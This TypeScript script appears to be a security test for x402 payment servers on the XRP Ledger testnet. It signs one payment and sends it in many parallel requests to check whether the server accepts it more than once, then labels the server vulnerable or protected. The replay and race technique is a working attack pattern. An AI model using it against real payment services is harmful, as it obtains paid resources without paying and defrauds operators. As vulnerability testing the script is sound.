import { config } from "dotenv";
import type { Network } from "@x402/core/types";
import { x402Client, x402HTTPClient } from "@x402/fetch";
import { createXrplWalletSigner, XRPL_TESTNET } from "@x402/xrpl";
import { ExactXrplScheme } from "@x402/xrpl/exact/client";
import { Wallet } from "xrpl";

config();

const xrplSeed = process.env.XRPL_SEED as string | undefined;
const xrplNetwork = (process.env.XRPL_NETWORK || XRPL_TESTNET) as Network;
const xrplWsUrl = process.env.XRPL_WS_URL as string | undefined;
const baseURL = process.env.RESOURCE_SERVER_URL ?? "http://localhost:4021";
const endpointPath = process.env.ENDPOINT_PATH ?? "/weather";
const url = `${baseURL}${endpointPath}`;
const raceCount = Number(process.env.RACE_COUNT ?? "10");

if (!xrplSeed) {
  console.error("XRPL_SEED is required");
  process.exit(1);
}

if (!Number.isFinite(raceCount) || raceCount <= 0) {
  console.error("RACE_COUNT must be a positive number");
  process.exit(1);
}

/**
 * Runs the XRPL race-condition demo: one payment, many parallel requests.
 * Demonstrates whether the server accepts the same payment multiple times.
 */
async function main(): Promise<void> {
  const xrplSigner = createXrplWalletSigner(Wallet.fromSeed(xrplSeed));

  console.log("XRPL Race Condition Vulnerability Demo");
  console.log("======================================");
  console.log(`Server: ${url}`);
  console.log(`Payer: ${xrplSigner.classicAddress}`);
  console.log(`Network: ${xrplNetwork}`);
  console.log(`Race count: ${raceCount}`);
  console.log("");

  const client = new x402Client().register(
    xrplNetwork,
    new ExactXrplScheme(
      xrplSigner,
      xrplWsUrl
        ? { wsUrlByNetwork: { [xrplNetwork as `xrpl:${number}`]: xrplWsUrl }, ticketCreateCount: 0 }
        : { ticketCreateCount: 5 },
    ),
  );
  const httpClient = new x402HTTPClient(client);

  console.log("Getting 402 response...");
  const initialResponse = await fetch(url);

  if (initialResponse.status !== 402) {
    throw new Error(`Expected 402, got ${initialResponse.status}. Is the server running?`);
  }
  console.log("Got 402 Payment Required");

  console.log("Parsing payment requirements...");
  let body: unknown;
  try {
    body = await initialResponse.json();
  } catch {
    throw new Error("Failed to parse 402 response body as JSON");
  }

  const paymentRequired = httpClient.getPaymentRequiredResponse(
    name => initialResponse.headers.get(name),
    body,
  );

  const xrplOption = paymentRequired.accepts.find(
    a => a.network.startsWith("xrpl") && a.scheme === "exact",
  );

  if (!xrplOption) {
    throw new Error("No XRPL exact payment option found in 402 response");
  }

  console.log(`Found XRPL exact option on network: ${xrplOption.network}`);
  console.log(`  Pay to: ${xrplOption.payTo}`);
  console.log(`  Amount: ${xrplOption.amount}`);
  console.log(`  Asset:  ${xrplOption.asset}`);
  console.log("");

  console.log("Building and signing payment transaction once...");
  const paymentPayload = await client.createPaymentPayload(paymentRequired);
  const paymentHeaders = httpClient.encodePaymentSignatureHeader(paymentPayload);

  console.log(`Firing ${raceCount} parallel requests with the same payment header...`);
  const startTime = Date.now();

  const results = await Promise.all(
    Array.from({ length: raceCount }, async (_, i) => {
      const response = await fetch(url, { headers: paymentHeaders });
      let responseBody: unknown;
      try {
        responseBody = await response.json();
      } catch {
        responseBody = await response.text();
      }
      let paymentResponse: unknown;
      try {
        paymentResponse = httpClient.getPaymentSettleResponse(name => response.headers.get(name));
      } catch {
        paymentResponse = null;
      }
      return { index: i, status: response.status, body: responseBody, paymentResponse };
    }),
  );

  const elapsed = Date.now() - startTime;

  console.log("Results:");
  console.log("--------");

  const succeeded = results.filter(r => r.status === 200);
  const failed = results.filter(r => r.status !== 200);

  for (const r of results) {
    const paymentStr = r.paymentResponse ? ` | payment: ${JSON.stringify(r.paymentResponse)}` : "";
    console.log(`  Request ${r.index}: HTTP ${r.status} - ${JSON.stringify(r.body)}${paymentStr}`);
  }

  console.log("");
  console.log(`Time: ${elapsed}ms`);
  console.log("");

  if (succeeded.length > 1) {
    console.log(
      `VULNERABLE: ${succeeded.length}/${raceCount} requests succeeded with the same payment.`,
    );
    console.log("The server accepted the same payment multiple times.");
  } else if (succeeded.length === 1) {
    console.log(
      `PROTECTED: Only 1/${raceCount} requests succeeded. ${failed.length} were correctly rejected.`,
    );
  } else {
    console.log(
      `All ${raceCount} requests failed (status codes: ${results.map(r => r.status).join(", ")}).`,
    );
    console.log("Check that the server is running and accepting payments.");
  }
}

main().catch(error => {
  console.error(error?.message ?? error);
  process.exit(1);
});
